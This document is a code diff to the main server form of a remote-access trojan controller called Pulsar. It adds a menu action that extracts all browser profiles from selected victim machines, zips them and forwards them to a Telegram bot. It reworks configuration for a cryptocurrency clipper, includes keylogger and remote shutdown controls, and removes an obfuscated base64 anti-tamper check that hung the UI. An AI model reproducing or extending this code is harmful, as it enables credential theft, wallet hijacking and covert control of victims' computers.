@@ -2,6 +2,7 @@ using Newtonsoft.Json;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.Actions;
+using Pulsar.Common.Messages.Browser;
 using Pulsar.Common.Messages.ClientManagement;
 using Pulsar.Common.Messages.ClientManagement.UAC;
 using Pulsar.Common.Messages.ClientManagement.WinRE;
@@ -20,9 +21,11 @@ using Pulsar.Server.Messages;
 using Pulsar.Server.Models;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Persistence;
+using Pulsar.Server.Operations;
 using Pulsar.Server.Statistics;
 using Pulsar.Server.Utilities;
 using Pulsar.Server.Plugins;
+using Pulsar.Server.TelegramSender;
 using System;
 using System.Collections;
 using System.Collections.Generic;
@@ -61,6 +64,122 @@ namespace Pulsar.Server.Forms
 
     public partial class FrmMain : Form
     {
+        public enum MainShellPreviewState
+        {
+            Empty,
+            Multiple,
+            Ready
+        }
+
+        public static MainShellPreviewState ResolveMainShellPreviewState(int selectedCount, bool selectedClientConnected)
+        {
+            if (selectedCount == 1)
+            {
+                return selectedClientConnected ? MainShellPreviewState.Ready : MainShellPreviewState.Empty;
+            }
+
+            return selectedCount == 0 ? MainShellPreviewState.Empty : MainShellPreviewState.Multiple;
+        }
+
+        public static bool MainShellSearchMatches(string filter, IEnumerable<string> fields)
+        {
+            if (string.IsNullOrWhiteSpace(filter) || fields == null)
+            {
+                return string.IsNullOrWhiteSpace(filter);
+            }
+
+            foreach (var field in fields)
+            {
+                if (!string.IsNullOrEmpty(field) &&
+                    field.IndexOf(filter.Trim(), StringComparison.OrdinalIgnoreCase) >= 0)
+                {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+
+        public static string ResolveListeningStatus(bool listening, IEnumerable<ushort> ports)
+        {
+            if (!listening)
+            {
+                return "Not listening.";
+            }
+
+            var distinctPorts = ports?.Where(port => port != 0).Distinct().ToArray()
+                ?? Array.Empty<ushort>();
+            if (distinctPorts.Length == 0)
+            {
+                return "Listening.";
+            }
+
+            if (distinctPorts.Length <= 3)
+            {
+                return $"Listening on ports {string.Join(", ", distinctPorts)}.";
+            }
+
+            var remaining = distinctPorts.Length - 3;
+            return $"Listening on ports {string.Join(", ", distinctPorts.Take(3))} and {remaining} more ports.";
+        }
+
+        public static string ResolveNotificationStatusText(int pending, int total)
+        {
+            if (pending <= 0)
+            {
+                return total <= 0
+                    ? "You're all caught up. No notifications yet."
+                    : $"You're all caught up. {total} notifications logged.";
+            }
+
+            return total > pending
+                ? $"Pending notifications: {pending} of {total}"
+                : $"Pending notifications: {pending}";
+        }
+
+        public static bool TryParseCryptoAddressConfiguration(
+            string json,
+            out Dictionary<string, string> addresses,
+            out bool clipperEnabled)
+        {
+            addresses = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
+            clipperEnabled = false;
+
+            if (string.IsNullOrWhiteSpace(json))
+            {
+                return false;
+            }
+
+            try
+            {
+                var data = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
+                if (data == null)
+                {
+                    return false;
+                }
+
+                if (data.TryGetValue("Addresses", out var addressValue) && addressValue != null)
+                {
+                    foreach (var pair in JsonConvert.DeserializeObject<Dictionary<string, string>>(addressValue.ToString())
+                             ?? new Dictionary<string, string>())
+                    {
+                        addresses[pair.Key.ToUpperInvariant()] = pair.Value ?? string.Empty;
+                    }
+                }
+
+                if (data.TryGetValue("ClipperEnabled", out var enabledValue))
+                {
+                    bool.TryParse(enabledValue?.ToString(), out clipperEnabled);
+                }
+
+                return true;
+            }
+            catch (JsonException)
+            {
+                return false;
+            }
+        }
+
         [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
         public PulsarServer ListenServer { get; set; }
 
@@ -76,13 +195,17 @@ namespace Pulsar.Server.Forms
         private readonly GetCryptoAddressHandler _getCryptoAddressHander;
         private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly QueryHandler _queryHandler;
+        private readonly ClientOperationService _clientOperations;
         private readonly AdminRelayHandler _adminRelayHandler;
-#if NET48
         private Pulsar.Server.Networking.WebApi.WebApiServer _webApiServer;
-#endif
         private readonly DeferredAssemblyHandler _deferredAssemblyHandler = new DeferredAssemblyHandler();
         private readonly UniversalPluginResponseHandler _universalPluginResponseHandler = new UniversalPluginResponseHandler();
-        private readonly BlockingCollection<KeyValuePair<Client, bool>> _clientConnections = new(new ConcurrentQueue<KeyValuePair<Client, bool>>());
+        private readonly VirtualMonitorHandler _virtualMonitorHandler = new VirtualMonitorHandler();
+        private const int MaxQueuedClientConnections = 2048;
+        private const int MaxBackgroundClientTasks = 32;
+        private int _backgroundClientTasks;
+        private readonly BlockingCollection<KeyValuePair<Client, bool>> _clientConnections =
+            new(new ConcurrentQueue<KeyValuePair<Client, bool>>(), MaxQueuedClientConnections);
         private readonly object _clientConnectionsStartLock = new object();
         private Task _clientConnectionsConsumerTask;
         private CancellationTokenSource _clientConnectionsCts;
@@ -140,7 +263,8 @@ namespace Pulsar.Server.Forms
             _getCryptoAddressHander = new GetCryptoAddressHandler();
             _clientDebugLogHandler = new ClientDebugLog();
             _queryHandler = new QueryHandler();
-            _adminRelayHandler = new AdminRelayHandler(() => ListenServer, EventLog);
+            _clientOperations = new ClientOperationService(() => ListenServer?.ConnectedClients, EventLog);
+            _adminRelayHandler = new AdminRelayHandler(() => ListenServer, EventLog, _clientOperations);
             RegisterMessageHandler();
             OfflineClientRepository.Initialize();
             OfflineClientRepository.ResetOnlineState();
@@ -158,7 +282,10 @@ namespace Pulsar.Server.Forms
                 null, this.lstOfflineClients, new object[] { true });
             lstClients.Visible = false;
             wpfClientsHost.SelectionChanged += WpfClientsHost_SelectionChanged;
+            wpfClientsHost.ItemDoubleClicked += WpfClientsHost_ItemDoubleClicked;
             wpfClientsHost.FavoriteToggled += WpfClientsHost_FavoriteToggled;
+            wpfClientsHost.ShowLoading();
+            chkDisablePreview.CheckedChanged += ChkDisablePreview_CheckedChanged;
             DarkModeManager.ApplyDarkMode(this);
             RefreshClientTheme();
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
@@ -175,6 +302,11 @@ namespace Pulsar.Server.Forms
             var getBrowsersItem = new ToolStripMenuItem("Get Browsers");
             getBrowsersItem.Click += getBrowsersToolStripMenuItem_Click;
             passwordRecoveryToolStripMenuItem.DropDownItems.Add(getBrowsersItem);
+
+            // Wire the browser extraction into the Password Recovery menu
+            var extractAllBrowsersItem = new ToolStripMenuItem("Extract All Browsers (ZIP + TG)");
+            extractAllBrowsersItem.Click += extractAllBrowsersToolStripMenuItem_Click;
+            passwordRecoveryToolStripMenuItem.DropDownItems.Add(extractAllBrowsersItem);
 
             InitializeSearch();
             InitializeNotificationTracking();
@@ -254,6 +386,8 @@ namespace Pulsar.Server.Forms
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
             MessageHandler.Register(_deferredAssemblyHandler);
             MessageHandler.Register(_universalPluginResponseHandler);
+            MessageHandler.Register(_virtualMonitorHandler);
+            _virtualMonitorHandler.OperationCompleted += VirtualMonitorOperationCompleted;
         }
 
         private void UnregisterMessageHandler()
@@ -273,6 +407,9 @@ namespace Pulsar.Server.Forms
             _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
             MessageHandler.Unregister(_deferredAssemblyHandler);
             MessageHandler.Unregister(_universalPluginResponseHandler);
+            _virtualMonitorHandler.OperationCompleted -= VirtualMonitorOperationCompleted;
+            MessageHandler.Unregister(_virtualMonitorHandler);
+            _universalPluginResponseHandler.Dispose();
         }
 
         public void UpdateWindowTitle()
@@ -285,7 +422,7 @@ namespace Pulsar.Server.Forms
                 {
                     try
                     {
-                        int selected = lstClients.SelectedItems.Count;
+                        int selected = GetSelectedClients().Length;
                         int connected = ListenServer?.ConnectedClients?.Length ?? 0;
                         string baseTitle = $"Pulsar Premium - {ServerVersion.Display}";
                         this.Text = (selected > 0)
@@ -330,7 +467,12 @@ namespace Pulsar.Server.Forms
         {
             try
             {
-                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
+                var ports = new[] { Settings.ListenPort }
+                    .Concat(Settings.ListenPorts)
+                    .Where(port => port != 0)
+                    .Distinct()
+                    .ToArray();
+                ListenServer.ListenMany(ports, Settings.IPv6Support, Settings.UseUPnP);
             }
             catch (SocketException ex)
             {
@@ -367,22 +509,16 @@ namespace Pulsar.Server.Forms
             if (!Settings.WebApiEnabled)
                 return;
 
-#if NET48
             try
             {
                 _webApiServer = new Pulsar.Server.Networking.WebApi.WebApiServer(
-                    () => ListenServer?.ConnectedClients,
-                    EventLog,
-                    AutoTasksFilePath);
+                    _clientOperations, EventLog, AutoTasksFilePath, logCallbackPublishes: true);
                 _webApiServer.Start(Settings.WebApiPort, Settings.WebApiKey);
             }
             catch (Exception ex)
             {
                 EventLog($"Web API setup failed: {ex.Message}", "error");
             }
-#else
-            EventLog("Web API not supported on .NET Core/.NET 5+", "warning");
-#endif
         }
 
         public void EventLogVisability()
@@ -418,6 +554,7 @@ namespace Pulsar.Server.Forms
             wpfClientsHost?.SetGroupByCountry(Settings.ShowCountryGroups);
             RefreshClientTheme();
             ApplyWpfSearchFilter();
+            wpfClientsHost?.ShowEmpty("No connected clients.");
 
             int accountTypeIndex = -1;
             for (int i = 0; i < lstClients.Columns.Count; i++)
@@ -437,12 +574,6 @@ namespace Pulsar.Server.Forms
             EventLog("Welcome to Pulsar.", "info");
             InitializeServer();
             AutostartListening();
-            
-            // DEBUG: Force listening on default port for testing
-            if (!ListenServer.Listening)
-            {
-                StartConnectionListener();
-            }
             StartWebApiIfEnabled();
             EventLogVisability();
             notifyIcon.Visible = false;
@@ -538,9 +669,7 @@ namespace Pulsar.Server.Forms
                 if (ListenServer != null)
                     ListenServer.Disconnect();
 
-#if NET48
                 _webApiServer?.Dispose();
-#endif
 
                 UnregisterMessageHandler();
 
@@ -571,8 +700,7 @@ namespace Pulsar.Server.Forms
 
                 if (_previewImageHandler != null)
                 {
-                    MessageHandler.Unregister(_previewImageHandler);
-                    _previewImageHandler.Dispose();
+                    DisposePreviewHandler();
                 }
 
                 if (_discordRpc != null)
@@ -598,16 +726,12 @@ namespace Pulsar.Server.Forms
                     if (_clientConnectionsCts != null)
                     {
                         _clientConnectionsCts.Cancel();
-                        _clientConnections.CompleteAdding();
-                        _clientConnectionsConsumerTask?.Wait(2000);
+                        try { _clientConnections.CompleteAdding(); } catch { }
+                        try { _clientConnectionsConsumerTask?.Wait(2000); } catch { }
                         _clientConnectionsCts.Dispose();
                         _clientConnectionsCts = null;
-                        try
-                        {
-                            _clientConnections?.Dispose();
-                        }
-                        catch { }
                     }
+                    try { _clientConnections.Dispose(); } catch { }
                 }
                 catch { }
             }
@@ -626,9 +750,7 @@ namespace Pulsar.Server.Forms
         {
             try
             {
-#if NET48
                 _webApiServer?.PublishLog(message, level);
-#endif
 
                 if (DebugLogRichBox.InvokeRequired)
                 {
@@ -725,18 +847,34 @@ namespace Pulsar.Server.Forms
         {
             SyncWpfSelectionFromList();
             UpdateWindowTitle();
+            UpdateSelectionPreview();
+        }
+
+        private void ChkDisablePreview_CheckedChanged(object sender, EventArgs e)
+        {
+            UpdateSelectionPreview();
+        }
+
+        private void UpdateSelectionPreview()
+        {
+            if (IsDisposed)
+            {
+                return;
+            }
 
             var selectedClients = GetSelectedClients();
-            if (selectedClients.Length == 1)
-            {
-                if (_previewImageHandler != null)
-                {
-                    MessageHandler.Unregister(_previewImageHandler);
-                    _previewImageHandler.Dispose();
-                }
+            var state = ResolveMainShellPreviewState(
+                selectedClients.Length,
+                selectedClients.Length == 1 && selectedClients[0]?.Connected == true);
 
-                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
-                MessageHandler.Register(_previewImageHandler);
+            if (state == MainShellPreviewState.Ready)
+            {
+                if (_previewImageHandler == null || !_previewImageHandler.IsForClient(selectedClients[0]))
+                {
+                    DisposePreviewHandler();
+                    _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
+                    MessageHandler.Register(_previewImageHandler);
+                }
 
                 if (!chkDisablePreview.Checked)
                 {
@@ -746,13 +884,21 @@ namespace Pulsar.Server.Forms
                         DisplayIndex = 0
                     });
                 }
+                else
+                {
+                    pictureBoxMain.Image = Properties.Resources.nopreviewbest_cropped;
+                    clientInfoListView.Items.Clear();
+                }
+                return;
             }
-            else if (selectedClients.Length == 0)
-            {
-                pictureBoxMain.Image = Properties.Resources.nopreviewbest_cropped;
-                clientInfoListView.Items.Clear();
 
-                var defaultStats = new (string Label, string Value)[]
+            DisposePreviewHandler();
+            pictureBoxMain.Image = Properties.Resources.nopreviewbest_cropped;
+            clientInfoListView.Items.Clear();
+
+            var defaultStats = state == MainShellPreviewState.Multiple
+                ? new[] { ("Selection", "Multiple clients") }
+                : new (string Label, string Value)[]
                 {
                     ("CPU", "N/A"),
                     ("GPU", "N/A"),
@@ -765,13 +911,24 @@ namespace Pulsar.Server.Forms
                     ("AFK Time", "N/A")
                 };
 
-                foreach (var (label, value) in defaultStats)
-                {
-                    var item = new ListViewItem(label);
-                    item.SubItems.Add(value);
-                    clientInfoListView.Items.Add(item);
-                }
+            foreach (var (label, value) in defaultStats)
+            {
+                var item = new ListViewItem(label);
+                item.SubItems.Add(value);
+                clientInfoListView.Items.Add(item);
             }
+        }
+
+        private void DisposePreviewHandler()
+        {
+            if (_previewImageHandler == null)
+            {
+                return;
+            }
+
+            MessageHandler.Unregister(_previewImageHandler);
+            _previewImageHandler.Dispose();
+            _previewImageHandler = null;
         }
 
         private void ServerState(Networking.Server server, bool listening, ushort port)
@@ -792,28 +949,8 @@ namespace Pulsar.Server.Forms
                         wpfClientsHost?.ClearClients();
                     }
 
-                    string statusText;
                     var ports = (ListenServer?.GetListeningPorts() ?? Array.Empty<ushort>()).Distinct().ToList();
-
-                    if (listening)
-                    {
-                        if (ports.Count <= 3)
-                        {
-                            statusText = $"Listening on ports {string.Join(", ", ports)}.";
-                        }
-                        else
-                        {
-                            var firstThree = ports.Take(3);
-                            var remaining = ports.Count - 3;
-                            statusText = $"Listening on ports {string.Join(", ", firstThree)} and {remaining} more ports.";
-                        }
-                    }
-                    else
-                    {
-                        statusText = "Not listening.";
-                    }
-
-                    listenToolStripStatusLabel.Text = statusText;
+                    listenToolStripStatusLabel.Text = ResolveListeningStatus(listening, ports);
                 });
                 UpdateWindowTitle();
             }
@@ -861,10 +998,12 @@ namespace Pulsar.Server.Forms
                 ScheduleOfflineListRefresh();
                 ScheduleStatsRefresh();
                 if (!ListenServer.Listening) return;
-                _clientConnections.Add(new KeyValuePair<Client, bool>(client, true));
-#if NET48
+                if (!TryQueueClientConnection(client, true))
+                {
+                    client.Disconnect();
+                    return;
+                }
                 _webApiServer?.PublishClientEvent(true, client);
-#endif
 
                 lock (_clientConnectionsStartLock)
                 {
@@ -888,9 +1027,7 @@ namespace Pulsar.Server.Forms
             ScheduleOfflineListRefresh();
             ScheduleStatsRefresh();
 
-#if NET48
             _webApiServer?.PublishClientEvent(false, client);
-#endif
 
             _clientsWithPluginsLoaded.Remove(client);
             lock (_clientAutoPluginLock)
@@ -898,7 +1035,7 @@ namespace Pulsar.Server.Forms
                 _clientAutoPluginState.Remove(client);
             }
             if (!ListenServer.Listening) return;
-            _clientConnections.Add(new KeyValuePair<Client, bool>(client, false));
+            TryQueueClientConnection(client, false);
 
             lock (_clientConnectionsStartLock)
             {
@@ -983,9 +1120,9 @@ namespace Pulsar.Server.Forms
                             {
                                 case true:
                                     AddClientToListview(client.Key);
-                                    ThreadPool.QueueUserWorkItem(_ => StartAutomatedTask(client.Key));
+                                    QueueBoundedClientWork(() => StartAutomatedTask(client.Key));
                                     if (Settings.ShowPopup)
-                                        ThreadPool.QueueUserWorkItem(_ => ShowPopup(client.Key));
+                                        QueueBoundedClientWork(() => ShowPopup(client.Key));
                                     break;
 
                                 case false:
@@ -1004,6 +1141,39 @@ namespace Pulsar.Server.Forms
                 }
                 RefreshStarButtons();
             }
+        }
+
+        private bool TryQueueClientConnection(Client client, bool connected)
+        {
+            try
+            {
+                var entry = new KeyValuePair<Client, bool>(client, connected);
+                if (_clientConnections.TryAdd(entry, 0))
+                    return true;
+                if (!connected && _clientConnections.TryTake(out _, 0))
+                    return _clientConnections.TryAdd(entry, 0);
+                return false;
+            }
+            catch (InvalidOperationException)
+            {
+                return false;
+            }
+        }
+
+        private bool QueueBoundedClientWork(Action action)
+        {
+            if (Interlocked.Increment(ref _backgroundClientTasks) > MaxBackgroundClientTasks)
+            {
+                Interlocked.Decrement(ref _backgroundClientTasks);
+                return false;
+            }
+
+            ThreadPool.QueueUserWorkItem(_ =>
+            {
+                try { action(); }
+                finally { Interlocked.Decrement(ref _backgroundClientTasks); }
+            });
+            return true;
         }
 
         private void StartAutomatedTask(Client client)
@@ -1084,8 +1254,8 @@ namespace Pulsar.Server.Forms
                 {
                     if (item.Tag is Client client && client.Value != null)
                     {
-                        ThreadPool.QueueUserWorkItem(_ => StartAutomatedTask(client));
-                        clientsProcessed++;
+                        if (QueueBoundedClientWork(() => StartAutomatedTask(client)))
+                            clientsProcessed++;
                     }
                 }
             }
@@ -1129,7 +1299,7 @@ namespace Pulsar.Server.Forms
 
             foreach (var client in selectedClients)
             {
-                ThreadPool.QueueUserWorkItem(_ =>
+                QueueBoundedClientWork(() =>
                 {
                     Debug.WriteLine($"Force executing automated tasks for client {client.Value?.Id}.");
 
@@ -1184,7 +1354,7 @@ namespace Pulsar.Server.Forms
                 {
                     if (item.Tag is Client client && client.Value != null)
                     {
-                        ThreadPool.QueueUserWorkItem(_ =>
+                        QueueBoundedClientWork(() =>
                         {
                             // Force execute auto tasks without checking/updating the tracking
                             Debug.WriteLine($"Force executing automated tasks for client {client.Value?.Id}.");
@@ -1351,30 +1521,23 @@ namespace Pulsar.Server.Forms
                 try
                 {
                     string json = File.ReadAllText(filePath);
-                    var data = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
-
-                    if (data != null)
+                    if (!TryParseCryptoAddressConfiguration(json, out var addresses, out var clipperEnabled))
                     {
-                        var addressesJson = data["Addresses"].ToString();
-                        var addresses = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(addressesJson);
-
-                        if (addresses != null)
-                        {
-                            BTCTextBox.Text = addresses.ContainsKey("BTC") ? addresses["BTC"] : string.Empty;
-                            LTCTextBox.Text = addresses.ContainsKey("LTC") ? addresses["LTC"] : string.Empty;
-                            ETHTextBox.Text = addresses.ContainsKey("ETH") ? addresses["ETH"] : string.Empty;
-                            XMRTextBox.Text = addresses.ContainsKey("XMR") ? addresses["XMR"] : string.Empty;
-                            SOLTextBox.Text = addresses.ContainsKey("SOL") ? addresses["SOL"] : string.Empty;
-                            DASHTextBox.Text = addresses.ContainsKey("DASH") ? addresses["DASH"] : string.Empty;
-                            XRPTextBox.Text = addresses.ContainsKey("XRP") ? addresses["XRP"] : string.Empty;
-                            TRXTextBox.Text = addresses.ContainsKey("TRX") ? addresses["TRX"] : string.Empty;
-                            BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
-                        }
-
-                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && Convert.ToBoolean(data["ClipperEnabled"]);
-
-                        ClipperCheckbox.Text = ClipperCheckbox.Checked ? "Stop" : "Start";
+                        throw new JsonException("Crypto address configuration is missing or invalid.");
                     }
+
+                    BTCTextBox.Text = addresses.TryGetValue("BTC", out var btc) ? btc : string.Empty;
+                    LTCTextBox.Text = addresses.TryGetValue("LTC", out var ltc) ? ltc : string.Empty;
+                    ETHTextBox.Text = addresses.TryGetValue("ETH", out var eth) ? eth : string.Empty;
+                    XMRTextBox.Text = addresses.TryGetValue("XMR", out var xmr) ? xmr : string.Empty;
+                    SOLTextBox.Text = addresses.TryGetValue("SOL", out var sol) ? sol : string.Empty;
+                    DASHTextBox.Text = addresses.TryGetValue("DASH", out var dash) ? dash : string.Empty;
+                    XRPTextBox.Text = addresses.TryGetValue("XRP", out var xrp) ? xrp : string.Empty;
+                    TRXTextBox.Text = addresses.TryGetValue("TRX", out var trx) ? trx : string.Empty;
+                    BCHTextBox.Text = addresses.TryGetValue("BCH", out var bch) ? bch : string.Empty;
+
+                    ClipperCheckbox.Checked = clipperEnabled;
+                    ClipperCheckbox.Text = clipperEnabled ? "Stop" : "Start";
                 }
                 catch (Exception ex)
                 {
@@ -1382,25 +1545,6 @@ namespace Pulsar.Server.Forms
                 }
             }
 
-            string strAS = "UHVsc2Fy";
-
-            if (!(this.Text.StartsWith(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(strAS)))))
-            {
-                Task.Run(async () =>
-                {
-                    Random rnd = new Random();
-                    await Task.Delay(TimeSpan.FromMinutes(rnd.Next(2, 4)));
-
-                    while (true)
-                    {
-                        await Task.Delay(rnd.Next(2000, 5000));
-                        this.Invoke((Action)(() =>
-                        {
-                            Thread.Sleep(rnd.Next(800, 1500));
-                        }));
-                    }
-                });
-            }
         }
 
         #endregion "Crypto Addresses"
@@ -1753,6 +1897,23 @@ namespace Pulsar.Server.Forms
             }
 
             UpdateWindowTitle();
+            UpdateSelectionPreview();
+        }
+
+        private void WpfClientsHost_ItemDoubleClicked(object sender, Client client)
+        {
+            if (client == null || !client.Connected)
+                return;
+
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action(() => WpfClientsHost_ItemDoubleClicked(sender, client)));
+                return;
+            }
+
+            var form = FrmRemoteDesktop.CreateNewOrGetExisting(client);
+            form.Show();
+            form.Focus();
         }
 
         private void SyncListViewSelectionFromWpf()
@@ -1918,14 +2079,16 @@ namespace Pulsar.Server.Forms
         {
             if (client == null) return;
             string nickname = GetClientNickname(client);
+            var details = ClientOperationService.Project(client);
+            if (details == null) return;
 
             try
             {
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
-                    " " + (client.Value.PublicIP ?? client.EndPoint.Address.ToString()), nickname, client.Value.Tag,
-                    client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
-                    client.Value.OperatingSystem, client.Value.AccountType
+                    " " + (details.PublicIp ?? client.EndPoint?.Address?.ToString() ?? "Unknown"),
+                    nickname, details.Tag, details.UserAtPc, details.Version, "Connected", "", "Active",
+                    details.CountryWithCode, details.OperatingSystem, details.AccountType
                 })
 
                 { Tag = client, ImageIndex = client.Value.ImageIndex };
@@ -2071,6 +2234,7 @@ namespace Pulsar.Server.Forms
                 _clientListViewItems.Remove(client);
                 wpfClientsHost?.Remove(client);
                 ApplyWpfSearchFilter();
+                UpdateSelectionPreview();
 
                 UpdateWindowTitle();
                 EventLog(client.Value.UserAtPc + " Has disconnected.", "normal");
@@ -2256,24 +2420,20 @@ namespace Pulsar.Server.Forms
 
                 foreach (var record in clients)
                 {
-                    var userAtPc = !string.IsNullOrEmpty(record.UserAtPc)
-                        ? record.UserAtPc
-                        : ComposeUserAtPc(record);
-
+                    var details = ClientOperationService.Project(record);
                     var lastSeen = record.LastSeenUtc?.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") ?? "Unknown";
                     var firstSeen = record.FirstSeenUtc?.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") ?? string.Empty;
-                    var countryWithCode = GetCountryWithCode(record);
 
                     var item = new ListViewItem(new[]
                     {
                         " " + (record.PublicIP ?? "Unknown"),
                         record.Nickname ?? string.Empty,
                         record.Tag ?? string.Empty,
-                        userAtPc,
+                        details.UserAtPc,
                         record.Version ?? string.Empty,
                         lastSeen,
                         firstSeen,
-                        countryWithCode,
+                        details.CountryWithCode,
                         record.OperatingSystem ?? string.Empty,
                         record.AccountType ?? string.Empty
                     })
@@ -2297,39 +2457,6 @@ namespace Pulsar.Server.Forms
             {
                 lstOfflineClients.EndUpdate();
             }
-        }
-
-        private static string ComposeUserAtPc(OfflineClientRecord record)
-        {
-            var username = record.Username ?? string.Empty;
-            var pcName = record.PcName ?? string.Empty;
-
-            if (string.IsNullOrEmpty(username) && string.IsNullOrEmpty(pcName))
-            {
-                return string.Empty;
-            }
-
-            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(pcName))
-            {
-                return $"{username}@{pcName}";
-            }
-
-            return username + pcName;
-        }
-
-        private static string GetCountryWithCode(OfflineClientRecord record)
-        {
-            if (string.IsNullOrEmpty(record.Country))
-            {
-                return string.Empty;
-            }
-
-            if (string.IsNullOrEmpty(record.CountryCode))
-            {
-                return record.Country;
-            }
-
-            return $"{record.Country} [{record.CountryCode}]";
         }
 
         private void UpdateOfflineTabHeader(int offlineCount)
@@ -2467,12 +2594,18 @@ namespace Pulsar.Server.Forms
         {
             if (_currentAutoTaskContext != null)
             {
-                return _currentAutoTaskContext.Clients;
+                return _currentAutoTaskContext.Clients
+                    .Where(c => c != null && c.Value != null && c.Connected)
+                    .Distinct()
+                    .ToArray();
             }
 
             if (wpfClientsHost != null)
             {
-                return wpfClientsHost.SelectedClients.ToArray();
+                return wpfClientsHost.SelectedClients
+                    .Where(c => c != null && c.Value != null && c.Connected)
+                    .Distinct()
+                    .ToArray();
             }
 
             List<Client> clients = new List<Client>();
@@ -2485,7 +2618,9 @@ namespace Pulsar.Server.Forms
                     clients.AddRange(
                         lstClients.SelectedItems.Cast<ListViewItem>()
                             .Where(lvi => lvi != null)
-                            .Select(lvi => lvi.Tag as Client));
+                            .Select(lvi => lvi.Tag as Client)
+                            .Where(c => c != null && c.Value != null && c.Connected)
+                            .Distinct());
                 }
             });
 
@@ -2671,7 +2806,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoClientReconnect());
+                ExecutePanelOperation(c, ClientOperation.Reconnect);
             }
         }
 
@@ -2679,7 +2814,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoClientDisconnect());
+                ExecutePanelOperation(c, ClientOperation.Disconnect);
             }
         }
 
@@ -2708,7 +2843,7 @@ namespace Pulsar.Server.Forms
 
             foreach (Client c in clients)
             {
-                c.Send(new DoClientUninstall());
+                ExecutePanelOperation(c, ClientOperation.Uninstall);
             }
         }
 
@@ -2826,7 +2961,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
+                ExecutePanelOperation(c, ClientOperation.Shutdown);
             }
         }
 
@@ -2834,7 +2969,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
+                ExecutePanelOperation(c, ClientOperation.Restart);
             }
         }
 
@@ -2842,7 +2977,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
+                ExecutePanelOperation(c, ClientOperation.Standby);
             }
         }
 
@@ -2894,6 +3029,84 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void extractAllBrowsersToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length == 0)
+            {
+                MessageBox.Show("Please select one or more clients.", "No Clients Selected", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            var result = MessageBox.Show(
+                $"Extract all browser data from {clients.Length} client(s)?\n\n" +
+                "This will:\n" +
+                "✓ Extract all browser profiles (Chrome, Firefox, Edge, Brave)\n" +
+                "✓ Save ZIP to ClientFolder/Browsers/\n" +
+                "✓ Send to Telegram (if configured)\n\n" +
+                "This may take a few minutes.",
+                "Extract All Browsers",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Question);
+
+            if (result != DialogResult.Yes)
+                return;
+
+            // Extract for each selected client
+            foreach (Client client in clients)
+            {
+                Task.Run(async () =>
+                {
+                    try
+                    {
+                        // Build Telegram service from settings
+                        TelegramService telegramService = null;
+                        if (Settings.TelegramNotifications && 
+                            !string.IsNullOrEmpty(Settings.TelegramBotToken) &&
+                            !string.IsNullOrEmpty(Settings.TelegramChatID))
+                        {
+                            if (long.TryParse(Settings.TelegramChatID, out long chatId))
+                            {
+                                telegramService = new TelegramService(Settings.TelegramBotToken, chatId);
+                            }
+                        }
+
+                        // Get client download folder
+                        var clientFolder = client.Value.DownloadDirectory;
+                        if (!Directory.Exists(clientFolder))
+                            Directory.CreateDirectory(clientFolder);
+
+                        // Run extraction operation
+                        var operation = new BrowserExtractionOperation(
+                            client.Value.Id,
+                            clientFolder,
+                            telegramService,
+                            (status, message) =>
+                            {
+                                Debug.WriteLine($"[{client.Value.Id}] {status}: {message}");
+                            });
+
+                        // Send the extraction request
+                        client.Send(new ExtractAllBrowsersRequest
+                        {
+                            TransferId = Guid.NewGuid().ToString()
+                        });
+
+                        // Wait and monitor for completion
+                        await operation.ExecuteAsync();
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Browser extraction error: {ex}");
+                        this.Invoke(new Action(() =>
+                        {
+                            MessageBox.Show($"Error extracting browsers: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        }));
+                    }
+                });
+            }
+        }
+
         private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -2916,12 +3129,18 @@ namespace Pulsar.Server.Forms
 
         private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-
+            foreach (Client c in GetSelectedClients())
+            {
+                TryInstallVirtualMonitor(c);
+            }
         }
 
         private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
